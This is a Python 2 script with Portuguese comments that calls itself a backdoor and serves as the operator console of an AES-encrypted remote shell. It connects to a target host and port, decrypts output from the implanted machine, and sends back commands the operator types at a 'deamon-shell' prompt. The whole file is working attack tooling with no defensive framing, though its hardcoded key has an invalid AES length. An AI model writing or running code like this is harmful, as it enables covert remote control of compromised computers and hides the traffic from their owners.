#!/usr/bin/python


from Crypto.Cipher import AES
from Crypto import Random
import socket
import base64
import os
import optparse
import sys

#criador darkcode
#code main
#backdoor eas/base64
#backdoor meterpreter v2
#backdoor ssh v3
#backdoor tor v4

EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# Criptografar / codificar e decodificar / decodificar uma string
secret = "ola mundo cruel cadia"
iv = Random.new().read(AES.block_size)
cipher = AES.new(secret, AES.MODE_CFB, iv)

# Parse argumento da linha de comando
parser = optparse.OptionParser("usage: python client.py -d <host ip> -p <port>")
parser.add_option('-d', dest='host', type = 'string', help = 'target host IP')
parser.add_option('-p', dest='port', type = 'int', help = 'target port')
(options, args) = parser.parse_args()
if (options.host == None):
    print parser.usage
    sys.exit()
elif (options.port == None):
    print parser.usage
    sys.exit()
else:
    host = options.host
    port = options.port
# Conectar ao host do servidor
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# main
while True:
    data = s.recv(1024)

   # Descriptografar dados
    decrypted = DecodeAES(cipher, data)
	# Verificar para o fim do arquivo
    if decrypted.endswith(secret) == True:
	    # Comando de impressao
        print decrypted[:-16]

        # recebendo comando
        cmd = raw_input("[deamon-shell =>]$ ")
        #Criptografar o comando
        encrypted = EncodeAES(cipher, cmd)
		# Enviar comando criptografado

        s.send(encrypted)
        # Verifique se o usuario digitou "exit" para sair shell remoto

        if cmd == "exit":
            break
    else:
        print decrypted
s.close()
sys.exit()
